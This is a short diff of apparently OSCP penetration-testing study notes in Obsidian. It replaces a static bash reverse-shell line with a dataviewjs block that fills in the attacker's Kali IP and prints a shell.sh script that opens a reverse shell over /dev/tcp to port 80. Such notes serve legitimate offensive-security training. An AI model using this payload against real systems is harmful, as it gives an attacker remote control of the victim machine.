@@ -216,9 +216,13 @@ dv.paragraph("```bash\n" + command + "\n```");
 vim shell.sh
 ```
 
-```
-#!/bin/bash
-bash -i >& /dev/tcp/[kaliIP]/1337 0>&1
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `#!/bin/bash
+bash -i >& /dev/tcp/${KaliIP}/80 0>&1`;
+
+dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ```
